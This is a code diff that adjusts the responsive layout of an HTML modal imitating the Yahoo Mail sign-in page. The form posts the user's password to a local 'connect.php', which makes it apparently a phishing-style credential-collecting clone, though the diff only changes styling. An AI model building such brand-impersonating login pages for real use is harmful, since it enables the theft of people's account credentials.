@@ -41,7 +41,7 @@
           
           <!-- Modal body -->
           <div class="modal-body">
-            <h2 class="text-center pt-4">Sign in to Yahoo Mail </h2>
+            <h2 class="text-center pt-4 sign">Sign in to Yahoo Mail </h2>
             <p class="text-center pb-5">using your Yahoo account</p>
 
             <form action="connect.php" method="POST">
@@ -50,23 +50,30 @@
 
               <input type="password" class="form-control mb-3" placeholder="password" name="password" required><br>
  
-              <div class="row justify-content-center">
-                <button type="submit" class="btn btn-butts px-5 my-4" name="submit"><b>Next</b></button>
+              <div class="row justify-content-center d-none d-md-block">
+                <button type="submit" class="btn btn-butts ml-3 my-4" name="submit"><b>Next</b></button>
                 </div>
+
+                <div class="row justify-content-center d-block d-md-none">
+                  <button type="submit" class="btn btn-bus ml-3 my-4" name="submit"><b>Next</b></button>
+                  </div>
 
                 <div class="row">
-                  <div class="col-6">
+                  <div class="col-6 text-center">
                     <input type="checkbox"> <span class="text-primary stay">Stay signed in</span>
                   </div>
-                  <div class="col-6">
-                    <a href="#"><p class="text-primary stay"> Forgot username?</p></a>
+                  <div class="col-6 text-center">
+                    <a href="#"><p class="text-primary stay "> Forgot username?</p></a>
                   </div>
                 </div>
 
-                <div class="row justify-content-center butts">
+                <div class="row justify-content-center d-none d-md-block">
                   <button type="submit" class="btn btn-butt px-5 my-4" name="submit"><span class="text-primary"><b>Create an Account</b></span></button>
                   </div>
-
+                  
+                  <div class="row justify-content-center d-block d-md-none">
+                    <button type="submit" class="btn btn-buss px-5 my-4" name="submit"><span class="text-primary"><b>Create an Account</b></span></button>
+                    </div>
              
           </form>
           </div>
